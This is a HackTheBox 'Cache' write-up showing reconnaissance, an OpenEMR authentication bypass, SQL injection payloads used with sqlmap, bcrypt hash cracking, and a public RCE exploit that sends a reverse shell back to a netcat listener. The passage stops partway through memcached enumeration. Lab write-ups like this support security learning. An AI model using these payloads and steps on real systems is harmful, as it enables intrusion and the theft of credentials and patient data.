# Cache | HackTheBox

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -p- -T3 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 21:30 EDT
Stats: 0:45:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 79.56% done; ETC: 22:27 (0:11:35 remaining)
Nmap scan report for 10.10.10.188
Host is up (0.34s latency).
Not shown: 65486 closed ports, 47 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/6%OT=22%CT=1%CU=35254%PV=Y%DS=2%DC=T%G=Y%TM=5F2CBBE6
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   330.10 ms 10.10.14.1
2   330.21 ms 10.10.10.188                                                                                                                                                                       
                                                                                                                                                                                                 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                            
Nmap done: 1 IP address (1 host up) scanned in 3381.19 seconds
```
The machine is running SSH and a HTTP server.

## 2. Enumeration
The site made accessible through the HTTP server is fairly basic with several pages.  
There is a login form which posts to a page called `net.html`. This page is actually viewable, and contains the following html:
```html
<html>
<head>
 <body onload="if (document.referrer == '') self.location='login.html';">   
	<style>
body  {
  background-color: #cccccc;
}
</style>
</head>
<center>
	<h1> Welcome Back!</h1>
	<img src="4202252.jpg">


<h1>This page is still underconstruction</h1>
</center>
 </body>
</html>
```
For me this is enough to rule out any login functionality of the site - posting to a html page does not allow for any actual credentials to be checked. However, this doesn't make sense, as some testing of the login form reveals that it is somehow testing the credentials and returning feedback about wrong usernames and passwords using alerts via javascript. Another look at the source code of the login page shows a script being included (see functionality.js)
```js
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});

```
This gives me the "working" login form credentials - ash:H@v3_fun, however for now these do not get me anywhere else.
When viewing the author's page I noted a previous project that was worked on.
```
ASH

CEO & Founder, CACHE
cache.htb
ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author & Creator of Cache. Check out his other projects like Cache:

HMS(Hospital Management System) 
```
As Ash's current product, Cache is hosted on cache.htb, I add hms.htb to my hosts and navigate to http://hms.htb, which brings up a login page for OpenEMR, which is a well-known hospital management system application. Though I don't have any credentials to access this app, there are a few known vulnerabilities and exploits that can be combined that provide a pathway.

### 3. Exploit OpenEMR
References:
- https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69
- https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
- https://www.binarytides.com/sqlmap-hacking-tutorial/

When googling I first found the Medium article, which led me to investigating two other exploits after reading the following:  
*For the exploit to work you must have the correct credential and this can be done by performing a SQL Injection on that particular version of the application. SQL Injection in add_edit_event_user.php is caused by unsanitized user input from the ​eid​, userid​, and ​pid​ parameters. Exploiting this vulnerability requires authentication to Patient Portal; however, it can be exploited without authentication when combined with the Patient Portal authentication bypass.*

In an attempt to find the patient portal I navigate to http://hms.htb/portal/ which shows a message "Patient Portal is turned off".
Following the vulnerability outline in the second link, I go to http://hms.htb/portal/account/register.php and get redirected back to the main login page via javascript. So to proceed, I turn javascript off via Burp.  
Once on the blank register.php page, I can access the add/edit user page by browsing to http://hms.htb/portal/add_edit_event_user.php.  
Once this page is accessed, it will be consistently available by supplying the same cookies in the request. This completes step 1 of the exploit.  
  
The SQL injection is also explained in the above two references. Knowing this, I can dump the database out using SQLMap but injecting into the parameter "eid".
```bash
kali@kali:~/Desktop/htb/cache$ sqlmap -r event_user.request --batch
        ___
       __H__                                                                
 ___ ___[)]_____ ___ ___  {1.4.6#stable}
|_ -| . [.]     | .'| . |                                                                                                          
|___|_  [,]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:17:44 /2020-08-10/

[04:17:44] [INFO] parsing HTTP request from 'event_user.request'
[04:17:45] [INFO] testing connection to the target URL
[04:17:45] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
[04:17:45] [INFO] testing if the target URL content is stable
[04:17:46] [INFO] target URL content is stable
[04:17:46] [INFO] testing if GET parameter 'eid' is dynamic
[04:17:46] [WARNING] GET parameter 'eid' does not appear to be dynamic
[04:17:47] [INFO] heuristic (basic) test shows that GET parameter 'eid' might be injectable (possible DBMS: 'MySQL')
[04:17:47] [INFO] testing for SQL injection on GET parameter 'eid'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[04:17:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:17:47] [WARNING] reflective value(s) found and filtering out
[04:17:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:17:57] [INFO] GET parameter 'eid' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --not-string="row")
[04:17:57] [INFO] testing 'Generic inline queries'
[04:17:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:17:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:17:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
...
[04:18:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:18:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:18:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:18:58] [INFO] target URL appears to have 4 columns in query
[04:18:59] [INFO] GET parameter 'eid' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'eid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (6440=6440) THEN 1 ELSE (SELECT 9488 UNION SELECT 3778) END))

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(2236,CONCAT(0x5c,0x717a707071,(SELECT (ELT(2236=2236,1))),0x71787a7871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x717a707071,0x56754e694f5a576e5472657856446b4b515771776750494f6547456871426d6a7950465952764943,0x71787a7871),NULL-- -
---
[04:18:59] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[04:19:01] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/hms.htb'
[04:19:01] [WARNING] you haven't updated sqlmap for more than 70 days!!!

[*] ending @ 04:19:01 /2020-08-10/
```
Checking what tables are available:
```bash
kali@kali:~/Desktop/htb/cache$ sqlmap -r event_user.request --batch --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.6#stable}       
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:32:12 /2020-08-10/

[04:32:12] [INFO] parsing HTTP request from 'event_user.request'
[04:32:12] [INFO] resuming back-end DBMS 'mysql' 
[04:32:12] [INFO] testing connection to the target URL
[04:32:13] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (6440=6440) THEN 1 ELSE (SELECT 9488 UNION SELECT 3778) END))

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(2236,CONCAT(0x5c,0x717a707071,(SELECT (ELT(2236=2236,1))),0x71787a7871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x717a707071,0x56754e694f5a576e5472657856446b4b515771776750494f6547456871426d6a7950465952764943,0x71787a7871),NULL-- -
---
[04:32:13] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[04:32:13] [INFO] fetching database names
[04:32:13] [INFO] retrieved: 'information_schema'
[04:32:14] [INFO] retrieved: 'openemr'
[04:32:14] [INFO] fetching tables for databases: 'information_schema, openemr'                                                                                                                              
[04:32:15] [INFO] retrieved: 'information_schema','CHARACTER_SETS'
[04:32:15] [INFO] retrieved: 'information_schema','COLLATIONS'
[04:32:15] [INFO] retrieved: 'information_schema','COLLATION_CHARACTER_SET_APPLICABILITY'
...
[04:32:41] [INFO] retrieved: 'openemr','addresses'
[04:32:41] [INFO] retrieved: 'openemr','amc_misc_data'
[04:32:42] [INFO] retrieved: 'openemr','amendments'
[04:32:42] [INFO] retrieved: 'openemr','amendments_history'
[04:32:43] [INFO] retrieved: 'openemr','ar_activity'
[04:32:43] [INFO] retrieved: 'openemr','ar_session'
[04:32:43] [INFO] retrieved: 'openemr','array'
[04:32:44] [INFO] retrieved: 'openemr','audit_details'
[04:32:44] [INFO] retrieved: 'openemr','audit_master'
[04:32:45] [INFO] retrieved: 'openemr','automatic_notification'
[04:32:45] [INFO] retrieved: 'openemr','background_services'
[04:32:45] [INFO] retrieved: 'openemr','batchcom'
[04:32:46] [INFO] retrieved: 'openemr','billing'
[04:32:46] [INFO] retrieved: 'openemr','calendar_external'
[04:32:47] [INFO] retrieved: 'openemr','categories'
[04:32:47] [INFO] retrieved: 'openemr','categories_seq'
[04:32:47] [INFO] retrieved: 'openemr','categories_to_documents'
[04:32:48] [INFO] retrieved: 'openemr','ccda'
[04:32:48] [INFO] retrieved: 'openemr','ccda_components'
[04:32:49] [INFO] retrieved: 'openemr','ccda_field_mapping'
...
[04:34:09] [INFO] retrieved: 'openemr','product_warehouse'
[04:34:09] [INFO] retrieved: 'openemr','registry'
[04:34:10] [INFO] retrieved: 'openemr','report_itemized'
[04:34:10] [INFO] retrieved: 'openemr','report_results'
[04:34:11] [INFO] retrieved: 'openemr','rule_action'
[04:34:11] [INFO] retrieved: 'openemr','rule_action_item'
[04:34:11] [INFO] retrieved: 'openemr','rule_filter'
[04:34:12] [INFO] retrieved: 'openemr','rule_patient_data'
[04:34:12] [INFO] retrieved: 'openemr','rule_reminder'
[04:34:13] [INFO] retrieved: 'openemr','rule_target'
[04:34:13] [INFO] retrieved: 'openemr','sequences'
[04:34:14] [INFO] retrieved: 'openemr','shared_attributes'
[04:34:14] [INFO] retrieved: 'openemr','standardized_tables_track'
[04:34:14] [INFO] retrieved: 'openemr','supported_external_dataloads'
[04:34:15] [INFO] retrieved: 'openemr','syndromic_surveillance'
[04:34:15] [INFO] retrieved: 'openemr','template_users'
[04:34:16] [INFO] retrieved: 'openemr','therapy_groups'
[04:34:16] [INFO] retrieved: 'openemr','therapy_groups_counselors'
[04:34:16] [INFO] retrieved: 'openemr','therapy_groups_participant_attendance'
[04:34:17] [INFO] retrieved: 'openemr','therapy_groups_participants'
[04:34:17] [INFO] retrieved: 'openemr','transactions'
[04:34:18] [INFO] retrieved: 'openemr','user_settings'
[04:34:19] [INFO] retrieved: 'openemr','users'
[04:34:19] [INFO] retrieved: 'openemr','users_facility'
[04:34:19] [INFO] retrieved: 'openemr','users_secure'
[04:34:20] [INFO] retrieved: 'openemr','valueset'
[04:34:20] [INFO] retrieved: 'openemr','version'
[04:34:21] [INFO] retrieved: 'openemr','voids'
[04:34:21] [INFO] retrieved: 'openemr','x12_partners'
```
There are a few users tables in the database, so we can dump those first. One of them has a hash.
```bash
kali@kali:~/Desktop/htb/cache$ sqlmap -r event_user.request --dump -D openemr -T users_secure
        ___
       __H__  
 ___ ___[.]_____ ___ ___  {1.4.6#stable}    
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:52:24 /2020-08-11/

[01:52:24] [INFO] parsing HTTP request from 'event_user.request'
[01:52:24] [INFO] resuming back-end DBMS 'mysql' 
[01:52:24] [INFO] testing connection to the target URL
[01:52:25] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (6440=6440) THEN 1 ELSE (SELECT 9488 UNION SELECT 3778) END))

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(2236,CONCAT(0x5c,0x717a707071,(SELECT (ELT(2236=2236,1))),0x71787a7871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x717a707071,0x56754e694f5a576e5472657856446b4b515771776750494f6547456871426d6a7950465952764943,0x71787a7871),NULL-- -
---
[01:52:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[01:52:25] [INFO] fetching columns for table 'users_secure' in database 'openemr'
[01:52:25] [INFO] retrieved: 'id','bigint(20)'
[01:52:26] [INFO] retrieved: 'username','varchar(255)'
[01:52:26] [INFO] retrieved: 'password','varchar(255)'
[01:52:27] [INFO] retrieved: 'salt','varchar(255)'
[01:52:27] [INFO] retrieved: 'last_update','timestamp'
[01:52:28] [INFO] retrieved: 'password_history1','varchar(255)'
[01:52:28] [INFO] retrieved: 'salt_history1','varchar(255)'
[01:52:28] [INFO] retrieved: 'password_history2','varchar(255)'
[01:52:29] [INFO] retrieved: 'salt_history2','varchar(255)'
[01:52:29] [INFO] fetching entries for table 'users_secure' in database 'openemr'                                                                                                                                                         
Database: openemr
Table: users_secure
[1 entry]
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+

```

### 4. Crack the user hash
https://www.tunnelsup.com/hash-analyzer/ determines the hash as bcrypt.
```bash
kali@kali:~/Desktop/htb/cache$ echo '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' > openemr_admin.hash
kali@kali:~/Desktop/htb/cache$ hashcat -a 0 -m 3200 openemr_admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.0.0) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, 1408/1472 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Initializing backend runtime for device #1...^C
kali@kali:~/Desktop/htb/cache$ hashcat -a 0 -m 3200 openemr_admin.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.0.0) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, 1408/1472 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
Time.Started.....: Tue Aug 11 02:07:56 2020, (1 sec)
Time.Estimated...: Tue Aug 11 02:07:57 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      744 H/s (8.09ms) @ Accel:4 Loops:32 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 848/14344385 (0.01%)
Rejected.........: 0/848 (0.00%)
Restore.Point....: 832/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-32
Candidates.#1....: michelle1 -> jesucristo

Started: Tue Aug 11 02:07:21 2020
Stopped: Tue Aug 11 02:07:58 2020
```
A new set of credentials has been obtained - openemr_admin:xxxxxx

### 5. Get a shell
Using these credentials I can now log in to the OpenEMR site. This gives me the version number - v5.0.1 (3), so I can verify the site is vulnerable to several authenticated RCE exploits. The first go-to would be the script made by the author of the article that I followed previously.
```bash
kali@kali:~/Desktop/htb/cache$ git clone https://github.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit.git
Cloning into 'OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 39 (delta 11), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (39/39), 11.85 KiB | 1.08 MiB/s, done.
kali@kali:~/Desktop/htb/cache$ mv OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/openemr_exploit.py .
```
The script needs to be modified to include an address to connect back to, creds for the app and the URL.
```bash
kali@kali:~/Desktop/htb/cache$ python openemr_exploit.py 
HELP MENU
[1] Change the listening IP Address and Create a Listener: Default port 9001
[2] Change the Username and Password to the approrpriate one           
[3] Change the URL to the correct one
[4] Execute the script and wait for a shell                                                              
[+] Verifying and Performing authentication with credentials provided please be patient
[+] Uploading a reverse shell it will take a minute
[+] You should be getting a shell soon
[+] Success!
```
The shell connects back to me.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.188 41958
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:42:59 up  2:34,  0 users,  load average: 0.00, 0.02, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### 6. Escalate privileges
Getting to ash's user account can be achieved from here using su.
```bash
www-data@cache:/var/www$ su - ash
su - ash
Password: H@v3_fun

ash@cache:~$
```

### 7. Enumeration
From Ash's account I begin basic enumeration of the file system:
- Ash's user folder
- All of /var/www
- Recursive grepping for different things
- Cron jobs
- Sudo -l
  
I also download Linux Exploit Suggester to the machine and run it.
```bash
ash@cache:/tmp$ wget http://10.10.15.116:8000/les.sh
wget http://10.10.15.116:8000/les.sh
--2020-08-11 07:13:00--  http://10.10.15.116:8000/les.sh
Connecting to 10.10.15.116:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84889 (83K) [text/x-sh]
Saving to: ‘les.sh’

les.sh              100%[===================>]  82.90K   101KB/s    in 0.8s    

2020-08-11 07:13:01 (101 KB/s) - ‘les.sh’ saved [84889/84889]

ash@cache:/tmp$ bash les.sh
bash les.sh

Available information:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

wget http://10.10.15.116:8000/lnum.sh
--2020-08-11 07:18:17--  http://10.10.15.116:8000/lnum.sh
Connecting to 10.10.15.116:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘lnum.sh’

lnum.sh             100%[===================>]  45.54K  61.5KB/s    in 0.7s    

2020-08-11 07:18:19 (61.5 KB/s) - ‘lnum.sh’ saved [46631/46631]

ash@cache:/tmp$ bash lnum.sh
bash lnum.sh
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Tue Aug 11 07:18:35 UTC 2020                                                                                                                                                                                                               
                                                                                                                                                                                                                                           

### SYSTEM ##############################################
[-] Kernel information:
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-109-generic (buildd@lgw01-amd64-010) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.2 LTS"
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
cache


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(ash) gid=1000(ash) groups=1000(ash)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Thu Jul  9 09:23:32 +0000 2020
ash              tty1                      Sun Nov 24 15:19:40 +0000 2019
luffy            pts/0    10.10.14.3       Wed May  6 08:54:44 +0000 2020
...
[+] Looks like we're hosting Docker:
Docker version 18.09.1, build 4c52b90


[-] Anything juicy in the Dockerfile:
-rwxrwxr-x 1 www-data www-data 1970 May 28  2018 /var/www/hms.htb/public_html/contrib/util/docker/Dockerfile


[-] Anything juicy in docker-compose.yml:
-rwxrwxr-x 1 www-data www-data 3995 May 28  2018 /var/www/hms.htb/public_html/docker-compose.yml
```
For full output see lnum_out.txt.
  
Docker is one thing that stands out, and there is also an instance of Memcached, as evidenced in the list of users in the passwd file:
```bash
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
```
... and in the running processes:
```bash
memcache   917  0.0  0.1 425792  4164 ?        Ssl  04:08   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
...
root       922  0.1  1.7 1008020 69496 ?       Ssl  04:08   0:13 /usr/bin/dockerd -H fd://
```
Looking at memcached, it is listening on port 11211 locally. It can be accessed via telnet (reference: https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line)
```bash
ash@cache:/tmp$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

stats
STAT pid 917
STAT uptime 12269
STAT time 1597131185
STAT version 1.5.6 Ubuntu
